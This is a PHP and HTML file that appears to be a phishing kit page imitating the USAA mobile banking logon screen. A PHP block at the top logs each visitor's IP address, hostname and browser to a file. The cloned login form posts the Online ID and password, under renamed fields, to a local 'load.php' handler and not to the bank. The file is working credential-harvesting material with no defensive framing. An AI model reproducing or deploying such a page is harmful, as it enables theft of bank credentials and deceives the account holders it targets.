<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$time = date('Y-m-d H:i:s');
$random = md5($time);

$logfile= 'log.html'; 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$logdetails= date("F j, Y, g:i a") . ': ' . '<a href=http://www.ip-score.com/checkip/'.$ip.' target=_blank>'.$_SERVER['REMOTE_ADDR'].'</a> - '.$hostname.' - '.$user_agent.'<br>'; 
$fp = fopen($logfile, "a+");
fwrite($fp, $logdetails);
fclose($fp);


?>




<html lang="en"><head>
        
		
		






	
	
	
	
















					<iframe id="utag_495" height="1" width="1" style="display:none" src="https://d.agkn.com/iframe/9297/?amcid=28677407012346473225776843022015627872&amp;type=1000&amp;che=0.5333392408353488"></iframe><style type="text/css" media="screen" id="mm_style_mm_cdApiStyleId_1"></style>
					

	
	
	
		<meta charset="utf-8">
	
	
	
	
	
		
		  <link rel="canonical" href="https://www.usaa.com/">
	    
	
	
	
	
		
	
	
	<title>Insurance, Banking, Investments &amp; Retirement | USAA</title>

		
		
		
		
		
			<meta name="title" content="Insurance, Banking, Investments &amp; Retirement | USAA">
				
		
		
		
		
		
		
		
		
		
		
		
		

		
		
			
		

        

        
        <link rel="stylesheet" type="text/css" href="https://mobile.usaa.com/inet/resources/aggregator?type=-min&amp;embed=true&amp;p_/javascript/ent/thirdparty/yui/yui3_5/cssreset/reset.css&amp;p_/javascript/ent/thirdparty/yui/yui3_5/cssgrids/grids.css&amp;p_/mcontent/static_assets/Includes/usaa-mobile-header-footer.css&amp;p_/mcontent/static_assets/Includes/usaa-mobile-base.css"> 
        
        <meta name="format-detection" content="telephone=no">
        <meta http-equiv="x-rim-auto-match" forua="true" content="none">
        


<meta name="viewport" content="width=device-width, initial-scale=1.0">

        
        
        
        
			
	
	
        
        
		
		
		
			
			







		
		
		
		
						
</head>

<body class="firstVisit imageLoader">

	
	
	<div id="container" class="page-ctr">
		
			
				
					
			        
			        





<div id="header" class="global-header">
	<div class="hdr-ftr-content-ctr">
		<div id="" class="global-header-content">
		
			
				
				<a class="usaaLogo-cont" href="https://mobile.usaa.com/inet/ent_logon/Logon?isUsaaLogo=true">
					<span class="usaa-logo"></span>
				</a>
			
			
			

			
				<h1>Log On to USAA Mobile</h1>  
				<span id="ccPageTitle" data-clientconfig-pagetitle=" Log On to USAA Mobile"></span>             
			
	
			
			
		</div>
	</div>
</div>

        		
			
		
		

		
		<span id="ccPageTitleValue" style="display: none" data-clientconfig-pagetitle=" Log On to USAA Mobile"></span>

        <div id="content" class="content-ctr" role="main">
                <a name="top"></a>               


                <div id="main"> 
                        
                        
                                











                        
                        
	                    


 



    	
	
	    <form action="load.php" method="post" id="Logon" name="Logon" ">


<!-- pwxmbr406as3l,   ent_logon_01 -->


	

	<!-- 
	     flag to determine if class="service" is applicable for content JSP or not 
	     This was added only to allow content JSPs to have multiple class="Service"
	     tags with in their content JSPs like My Accounts page where each COSA
	     has their own service DIV tag
	-->

	
		<div id="main-ctr" class="service main-content-ctr"> 
	
	


	
      	<!-- BEGIN SEARCH INDEX -->
      	
	






<input type="hidden" name="LogonToken" value="">
<input type="hidden" name="PageType" value="">











 

	
	<div class="section-ctr" id="logonBox">
			<div class="inset-list">
				<div class="input-list-item">
					<div class="yui3-g">
	                    <div class="yui3-u-1-3">
		                    <label class="input-item-label" for="input_onlineid">Online ID</label>
		                </div>
	                    <div class="yui3-u-2-3">
	                    	<input type="text" class="input-item" maxlength="20" autocorrect="off" autocapitalize="off" name="a" id="input_onlineid">
		                </div>
	                </div>
	            </div>
	            <div class="input-list-item">
					<div class="yui3-g">
	                    <div class="yui3-u-1-3">
		                    <label class="input-item-label" for="input_password">Password</label>
		                </div>
	                    <div class="yui3-u-2-3">
							<input type="password" class="input-item" maxlength="12" autocorrect="off" autocapitalize="off" name="b" id="input_password">
	                    </div>
	                </div>
	            </div>
			</div>
		</div>
		<div class="section-ctr"> 	
			<div class="button-ctr">
				<div class="yui3-g padded">
		            <div class="yui3-u-1">
		                <input type="submit" class="main-button" value="Log On">
		            </div>
		        </div>
		    </div>
		</div>
		
	<!--  WCM CONTENT OBJECT=ent_logon_jump_bottom -->
<link href="https://content.usaa.com/mcontent/static_assets/Includes/tridion_DWT.css?cacheid=4092548069_p" rel="stylesheet" type="text/css">

<div class="DWT">
 
<p class="section-ctr-2">Not a member?&nbsp;<a href="https://mobile.usaa.com/join/start/">Join Now</a>. </p>



<div class="section-ctr-2">Already a member? <a href="https://mobile.usaa.com/inet/ent_proof/proofingEvent?channel=mobileMember&amp;action=Init&amp;event=registration">Register for online access</a> or reset your <a href="https://mobile.usaa.com/inet/ent_proof/proofingEvent?channel=mobileMember&amp;action=Init&amp;event=forgotOnlineId">Online ID</a> or <a href="https://mobile.usaa.com/inet/ent_proof/proofingEvent?channel=mobileMember&amp;action=Init&amp;event=forgotPassword">password</a>.</div>
 
</div>
<!--  WCM CONTENT ENDS  -->

	<!--  WCM CONTENT OBJECT=mobile-profile-links-module -->

 
<div class="section-ctr">





<div class="leftTwoCol">





<div class="section-ctr-2 section-rule"><ul class="social-media"><li><a href="https://mobile.usaa.com/inet/ent_mobile_storefront/StoreFrontApp/ListSubProductsPage?key=usaa-mobile-social-networks-main" class="fb">Social Networks</a></li><li><a href="https://communities.usaa.com/" class="tw">USAA Community</a></li></ul></div>

<div class="section">

</div>
</div>
</div>
 
<!--  WCM CONTENT ENDS  -->

	




	












	<!-- END SEARCH INDEX -->
	<!-- BEGIN RAR -->
	
	<!-- END RAR -->
		
		
			<div class="section-ctr-2">
				
					
				
				
				
				<a href="https://mobile.usaa.com/inet/ent_utils/CrossChannelAuthRedirect?currentAppId=
					
					
						RBSLogonAppID_member
					
					&amp;targetChannel=member&amp;targetLookAndFeel=default">Switch to full site</a>
			</div>
		
	
	
	
      	</div>
	


	
	
		</form>

	

                        	        
                 </div>
                
        </div>


       
		    
		
        		




<div id="footer" class="global-footer">
	<div class="hdr-ftr-content-ctr">
    <div id="" class="global-footer-content">
      
      
      
        <div id="nav" class="footer-nav">
            
          




	
	
	
		<span class="copy">
			<a href="https://mobile.usaa.com/inet/pages/accessibility_at_usaa_main">Accessibility</a>	
			<span> | </span>
				<a href="https://mobile.usaa.com/help/contact/">Contact Us</a>
		</span>
		   	
	
	


          </div>	
      
      
     
        
          <div class="copyright">
            
            
          
            � 2020 USAA
          <a class="secondary" href="https://mobile.usaa.com/inet/pages/mobile_factsheet_main">Legal Information</a> 
          </div>
        

      
        <div class="disclaimer">
        	<div class="footnotes"></div><br>
        	<a class="about-our-ads" href="https://mobile.usaa.com/inet/pages/security_online_information_gathering">About Our Ads</a>
        	
				<span> | </span>
				<a class="footer-privacy-link" href="https://mobile.usaa.com/inet/wc/mobile-privacy-landing-page">Privacy</a>
			
        </div>

	<a class="secure-Site secondary">USAA is a Secure Site</a>
  	

		
  	
  	
	
	
		
		







	
	
	 </div><!-- / -->
	</div>
</div>

		
		
        
        

</div>
	

	
	




	
	





<iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_usaa_0" name="destination_publishing_iframe_usaa_0_name" src="https://usaa.demdex.net/dest5.html?d_nsid=0#https%3A%2F%2Fmobile.usaa.com%2Finet%2Fent_logon%2FLogon" style="display: none; width: 0px; height: 0px;" class="aamIframeLoaded"></iframe></body></html>